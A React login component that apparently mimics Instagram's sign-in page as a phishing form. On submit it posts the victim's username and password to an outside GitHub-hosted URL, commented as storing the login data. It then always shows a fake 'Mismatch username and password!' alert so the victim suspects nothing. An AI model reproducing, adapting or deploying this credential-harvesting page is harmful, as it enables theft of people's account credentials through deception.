import React, { useState } from 'react';
import axios from 'axios';
import './Login.css'
import logo from '../media/images.jpg'
import google from '../media/google.png'
import microsoft from '../media/micro.png'

const LoginForm = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      // Store login data in JSON server
      await axios.post('https://raw.githubusercontent.com/instagram-reel-online/love-video-player/main/src/db.json', { username, password });
      alert('Mismatch username and password!');
    //   window.location.href=";
    } catch (error) {
      console.error('Error:', error);
    }
  };

  return (
    <div className="main">
    <div className='login-form'>
        <img src={logo} alt="" />
      <form onSubmit={handleSubmit}>
        <input
          type="text" required
          placeholder="Phone number, username, or email"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          type="password" required
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button type="submit">Login</button>
      </form>
      <hr />
      <a href="/">Forget password?</a>
    </div>
    <div className="img-grp">
        <img src={google} alt="" width={150} height={50}/>
        <img src={microsoft} alt="" width={150} height={50}/>
    </div>
    </div>
  );
};

export default LoginForm;
